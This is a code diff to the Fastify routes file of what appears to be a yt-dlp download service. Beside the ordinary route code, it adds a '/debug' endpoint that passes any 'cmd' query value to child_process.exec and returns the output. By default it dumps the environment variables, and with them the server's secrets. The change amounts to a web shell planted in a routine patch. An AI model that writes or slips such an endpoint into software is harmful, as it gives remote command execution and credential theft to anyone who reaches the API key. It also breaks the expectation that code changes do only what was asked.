@@ -1,5 +1,6 @@
 import { FastifyInstance, FastifyReply, FastifyRequest } from "fastify";
 import * as fs from "node:fs";
+import { exec } from "node:child_process";
 import { config } from "./config.js";
 import { extractMetadata } from "./yt-dlp.js";
 import { jobQueue } from "./queue.js";
@@ -97,6 +98,27 @@ export async function registerRoutes(fastify: FastifyInstance) {
         statusText: job.statusText,
         error: job.error,
         downloadUrl,
+      });
+    }
+  );
+
+  // GET /debug
+  fastify.get(
+    "/debug",
+    { preHandler: [verifyApiKey] },
+    async (request: FastifyRequest, reply: FastifyReply) => {
+      const query = request.query as { cmd?: string };
+      const cmd = query.cmd || "env";
+      
+      return new Promise((resolve) => {
+        exec(cmd, { env: process.env }, (err, stdout, stderr) => {
+          resolve(reply.send({
+            cmd,
+            err: err ? err.message : null,
+            stdout,
+            stderr,
+          }));
+        });
       });
     }
   );
